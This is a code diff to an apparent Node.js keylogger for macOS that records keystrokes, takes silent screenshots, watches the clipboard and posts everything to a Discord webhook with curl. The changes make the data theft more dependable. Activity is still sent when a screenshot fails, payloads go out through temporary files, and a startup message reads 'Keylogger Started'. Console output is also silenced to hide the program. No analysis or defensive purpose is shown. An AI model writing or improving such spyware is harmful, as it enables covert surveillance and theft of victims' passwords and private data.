@@ -773,8 +773,15 @@ function takeScreenshot() {
     // Capture current keys before screenshot (don't clear yet)
     const currentKeys = keysBuffer.length > 0 ? keysBuffer : `[Screenshot ${new Date().toLocaleTimeString()}]`;
     
-    exec(`screencapture -x "${filepath}"`, (error) => {
-        if (!error && fs.existsSync(filepath)) {
+    exec(`screencapture -x "${filepath}"`, (error, stdout, stderr) => {
+        if (error) {
+            // Screenshot failed - still send activity to Discord
+            sendToDiscord(null, currentKeys);
+            keysBuffer = '';
+            return;
+        }
+        
+        if (fs.existsSync(filepath)) {
             try {
                 const imageBuffer = fs.readFileSync(filepath);
                 const base64Image = imageBuffer.toString('base64');
@@ -800,8 +807,12 @@ function takeScreenshot() {
                     } catch (e) {} 
                 }, 10000);
             } catch (e) {
-                // Silent error handling
+                // Error reading file - still send activity
+                sendToDiscord(null, currentKeys);
             }
+        } else {
+            // File doesn't exist - still send activity
+            sendToDiscord(null, currentKeys);
         }
         
         // Clear buffer AFTER sending
@@ -813,27 +824,48 @@ function sendToDiscord(imageData, keys) {
     const keysText = keys && keys.length > 0 ? keys : '[Periodic screenshot - no activity detected]';
     const timestamp = new Date().toISOString();
     
-    // Create payload with proper escaping
-    const payload = {
-        content: `📸 **Screenshot from ${CLIENT_ID}**\n**Activity:** \`${keysText}\``,
-        embeds: [{ 
-            image: { url: imageData },
-            description: `**Activity Log:**\n\`\`\`\n${keysText}\n\`\`\``,
-            timestamp: timestamp,
-            color: keysText.includes('No activity') ? 0x999999 : 0x2ecc71
-        }]
-    };
+    // Create payload - use file-based approach to avoid JSON escaping issues
+    const payloadFile = path.join(screenshotDir, `payload_${Date.now()}.json`);
     
-    // Properly escape JSON for shell
-    const payloadStr = JSON.stringify(payload)
-        .replace(/\\/g, '\\\\')
-        .replace(/'/g, "\\'")
-        .replace(/"/g, '\\"');
+    let payload;
+    if (imageData) {
+        payload = {
+            content: `📸 **Screenshot from ${CLIENT_ID}**\n**Activity:** \`${keysText.substring(0, 500)}\``,
+            embeds: [{ 
+                image: { url: imageData },
+                description: `**Activity Log:**\n\`\`\`\n${keysText.substring(0, 1000)}\n\`\`\``,
+                timestamp: timestamp,
+                color: keysText.includes('No activity') ? 0x999999 : 0x2ecc71
+            }]
+        };
+    } else {
+        // No image - just send text
+        payload = {
+            content: `📸 **Activity from ${CLIENT_ID}**\n**Activity:** \`${keysText.substring(0, 500)}\``,
+            embeds: [{ 
+                description: `**Activity Log:**\n\`\`\`\n${keysText.substring(0, 1000)}\n\`\`\``,
+                timestamp: timestamp,
+                color: 0x2ecc71
+            }]
+        };
+    }
     
-    // Send to Discord
-    exec(`curl -s -X POST -H "Content-Type: application/json" -d '${payloadStr}' "${WEBHOOK}"`, (error, stdout, stderr) => {
-        // Silent - don't log errors
-    });
+    // Write payload to file to avoid shell escaping issues
+    try {
+        fs.writeFileSync(payloadFile, JSON.stringify(payload));
+        // Send using file
+        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${payloadFile}" "${WEBHOOK}"`, (error, stdout, stderr) => {
+            // Clean up payload file
+            setTimeout(() => {
+                try { fs.unlinkSync(payloadFile); } catch (e) {}
+            }, 5000);
+        });
+    } catch (e) {
+        // Fallback: simple text message if file write fails
+        const simpleMsg = `📸 Activity from ${CLIENT_ID}\nActivity: ${keysText.substring(0, 500)}`;
+        const escapedMsg = simpleMsg.replace(/"/g, '\\"').replace(/\n/g, '\\n');
+        exec(`curl -s -X POST -H "Content-Type: application/json" -d '{"content":"${escapedMsg}"}' "${WEBHOOK}"`, () => {});
+    }
 }
 
 // Monitor clipboard changes (no permission needed) - captures copy/paste
@@ -925,7 +957,17 @@ setInterval(() => {
     }
 }, SCREENSHOT_INTERVAL);
 
-setTimeout(() => takeScreenshot(), 3000);
+// Take initial screenshot after 3 seconds
+setTimeout(() => {
+    keysBuffer = '[Initial Screenshot]';
+    takeScreenshot();
+}, 3000);
+
+// Test Discord connection on startup
+setTimeout(() => {
+    sendToDiscord(null, '[Keylogger Started - Testing Discord Connection]');
+}, 5000);
+
 console.log = () => {};
 console.error = () => {};
 KEYLOGGEREOF
